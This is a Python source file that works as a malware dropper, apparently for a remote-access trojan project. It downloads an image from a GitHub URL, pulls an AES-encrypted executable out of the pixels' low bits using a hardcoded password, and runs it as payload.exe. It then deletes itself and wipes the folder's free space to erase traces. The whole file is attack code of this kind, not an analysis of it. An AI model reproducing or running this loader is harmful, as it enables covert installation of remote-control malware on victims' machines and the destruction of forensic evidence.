import urllib
import hashlib
import struct
import subprocess
import os
from Crypto import Random
from Crypto.Cipher import AES
from PIL import Image


class AESCipher:
    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:]))

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s) - 1:])]


def get_payload():
        return urllib.urlretrieve("https://github.com/expertsecuritedigitale/ESD14/tree/thibault/RAT_second_try/dist",
                                  "payload.png")


def assemble(v):
    bytes = ""
    length = len(v)
    for idx in range(0, len(v)/8):
        byte = 0
        for i in range(0, 8):
            if idx*8+i < length:
                byte = (byte << 1) + v[idx*8+i]
        bytes = bytes + chr(byte)

    payload_size = struct.unpack("i", bytes[:4])[0]

    return bytes[4: payload_size + 4]


def extract(in_file, out_file, password):
    img = Image.open(in_file)
    (width, height) = img.size
    conv = img.convert("RGBA").getdata()

    v = []
    for h in range(height):
        for w in range(width):
            (r, g, b, a) = conv.getpixel((w, h))
            v.append(r & 1)
            v.append(g & 1)
            v.append(b & 1)

    data_out = assemble(v)

    cipher = AESCipher(password)
    data_dec = cipher.decrypt(data_out)
    out_f = open(out_file, "wb")
    out_f.write(data_dec)
    out_f.close()


def execute(path):
    subprocess.Popen([path])


def destruct(self_path):
    os.remove(self_path)
    folder_path = os.path.dirname(self_path)
    os.system("cipher /W:%s" % folder_path)


def main():
    path = os.path.dirname(os.path.abspath(__file__))
    payload_path = path+"/payload.exe"
    payload = get_payload()
    print(payload)
    if payload:
        extract(payload, payload_path, "toto")
        execute(payload_path)
        destruct(path)
    else:
        destruct(path)


if __name__ == "__main__":
    main()
